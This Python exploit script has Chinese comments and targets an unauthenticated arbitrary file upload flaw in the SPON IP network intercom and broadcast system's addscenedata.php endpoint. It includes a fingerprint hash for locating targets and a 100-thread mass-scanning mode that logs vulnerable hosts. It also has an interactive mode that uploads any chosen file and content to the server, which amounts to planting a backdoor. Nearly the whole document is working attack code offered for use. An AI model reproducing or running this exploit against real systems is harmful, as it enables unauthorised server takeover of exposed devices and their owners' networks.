#SPON世邦 IP网络对讲广播系统 多处文件上传漏洞复现
#SPON世邦IP网络对讲广播系统 addscenedata.php、uploadjson.php、my_parser.php等接口处存在任意文件上传漏洞，未经身份验证的攻击者可利用此漏洞上传恶意后门文件，可导致服务器失陷。
#spon IP网络对讲广播系统uploadjson.php存在任意文件上传漏洞，攻击者可以通过构造特殊请求包上传恶意后门文件，从而获取服务器权限
#icon_hash="-1830859634"   SBTX_SPONIP_addscenedata_Fup.py SBTX_SPONIP_uploadjson_Fup.py SBTX_SPONIP_my_parser_Fup.py
# 导包
import requests,sys,argparse,re,time,colorama
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止报错
from colorama import Fore, Style
# GREEN = '\033[92m' #GREEN是一个表示绿色的ANSI转义序列，\033[92m用于设置文本颜色为绿色，RESET是用于重置文本颜色的ANSI转义序列，\033[0m用于将文本颜色恢复为默认值。
# RESET = '\033[0m'
BLUE = Fore.BLUE
RESET = Style.RESET_ALL
# 指纹模块
def banner():
    banner = """

 ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀    ███▄    █  ▒█████   █     █░    ▐██▌ 
▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒     ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░    ▐██▌ 
▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█     ▐██▌ 
░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█     ▓██▒ 
 ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██░   ▓██░░ ████▓▒░░░██▒██▓     ▒▄▄  
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒      ░▀▀▒ 
  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░      ░  ░ 
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░         ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░        ░    
                                     ░                                                        
                                    @author:           🐖sawa🐇
                                    @version:          1.0.0
                                    For:               世邦通信 SPON IP网络对讲广播系统addscenedata.php任意文件上传漏洞
"""
    print(banner)

# 主函数模块
def main():
    banner()
    parser = argparse.ArgumentParser(description="This is a 世邦通信 SPON IP网络对讲广播系统addscenedata.php任意文件上传vulnerability")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your urllink')
    parser.add_argument('-f','-file',dest='file',type=str,help='file path(Absolute Path)')
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")# print("Usage:\n\t python3 {} -h".format(sys.argv[0]))

headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Connection':'close',
    'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundary4LuoBRpTiVBo9cIQ',
    'Accept-Encoding':'gzip',
}
# poc模块
def poc(target):
    payload_url ="/php/addscenedata.php"
    url = target+payload_url
    data = {"------WebKitFormBoundary4LuoBRpTiVBo9cIQ\r\nContent-Disposition: form-data; name": "\"upload\"; filename=\"1.php\"\r\nContent-Type: application/octet-stream\r\n \r\n<?php phpinfo(); ?>\r\n------WebKitFormBoundary4LuoBRpTiVBo9cIQ--\r\n\r\n"}
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=5)
        # match = re.search(r'VIDEO/(\d+\.jsp)',res.text)
        result = target + '/images/scene/1.php'
        res1 = requests.get(url=result,headers=headers,verify=False,timeout=5)
        if  res.status_code == 200 and '{"res":"1"}' in res.text and res1.status_code == 200 :
            print( f"{BLUE}[+] {target} Vulnerability exists,\n Access path: {result} {RESET}")
            with open ('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")
                return True
        else :
            print(f"[-] {target} Vulnerability does not exist")
            with open ('without-bug.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")
                return False       
    except Exception as e:
        print(f"[*] {target} server error,{e}")
        with open ('warning.txt','a',encoding='utf-8') as fp:
            fp.write(target+"\n")
            return False


def exp(target):
    print("--------------------正在进行漏洞利用...---------------------")
    time.sleep(2)
    # os.system("cls")
    while True:
        filename = input("请输入你要上传的文件(q--->quit)\n>>>")
        content = input("请输入你要上传的内容:(q--->quit)\n>>>")
        if filename =='q' or content =='q':
            print("-------------正在退出,稍安勿躁 Wait a minute...-------------")
            print("Bye~欢迎下次光临")
            break
        data = f'------WebKitFormBoundary4LuoBRpTiVBo9cIQ\r\nContent-Disposition: form-data; name": "\"upload\"; filename=\"{filename}\"\r\nContent-Type: application/octet-stream\r\n \r\n{content}\r\n------WebKitFormBoundary4LuoBRpTiVBo9cIQ--\r\n\r\n'
        try:
            res = requests.post(url=target+'/php/addscenedata.php',headers=headers,data=data,timeout=5,verify=False)
            # match = re.search(r'VIDEO/(\d+\.jsp)',res.text)
            result = f"{target}/images/scene/{filename}"
            res1 = requests.get(url=result,headers=headers,verify=False,timeout=5)
            if  res.status_code == 200 and res1.status_code == 200 :
                print( f"{BLUE}[+] Upload successfully,Access path:{result} {RESET}")
            else:
                print(f"Fail to upload!")
        except:
                print("执行异常,Try again!")

if __name__ == '__main__':
    main()
